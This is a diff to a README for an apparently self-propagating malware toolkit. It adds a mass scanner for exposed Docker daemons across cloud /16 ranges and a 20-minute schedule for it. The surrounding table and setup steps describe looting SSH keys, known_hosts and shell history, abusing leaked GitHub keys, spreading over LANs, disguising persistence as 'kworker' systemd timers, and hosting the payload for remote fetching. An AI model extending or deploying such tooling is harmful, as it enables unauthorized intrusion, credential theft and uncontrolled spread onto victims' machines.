@@ -25,10 +25,12 @@ Everything else is a small runnable reference implementation of it.
 | `hunt.sh` | Hunter: trust-graph loot, then leaked GitHub keys -> probe -> deploy |
 | `loot.sh` | Trust-graph looter: this host's ssh config, known_hosts, own keys, history, LAN |
 | `dock.sh` | Docker spreader: exposed :2375 daemons, no credentials at all |
+| `dockmass.sh` | Docker mass sweeper: cloud /16 space, thousands of addresses per run |
 | `kworker-spread.service` / `.timer` | LAN spread schedule |
 | `kworker-hunt.service` / `.timer` | Hunt schedule |
 | `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
 | `kworker-dock.service` / `.timer` | Docker scan schedule (every 6h) |
+| `kworker-mass.service` / `.timer` | Docker mass sweep schedule (every 20min, budgeted) |
 
 ## 1. Host the payload
 Put on any https host you control (a cheap VPS, a GitHub release, an object
@@ -39,6 +41,7 @@ repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
 `kworker-spread.service`, `kworker-spread.timer`, `kworker-hunt.service`,
 `kworker-hunt.timer`, `kworker-loot.service`, `kworker-loot.timer`,
 `dock.sh`, `kworker-dock.service`, `kworker-dock.timer`,
+`dockmass.sh`, `kworker-mass.service`, `kworker-mass.timer`,
 `bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
 in `bootstrap.sh` to that base URL.
 
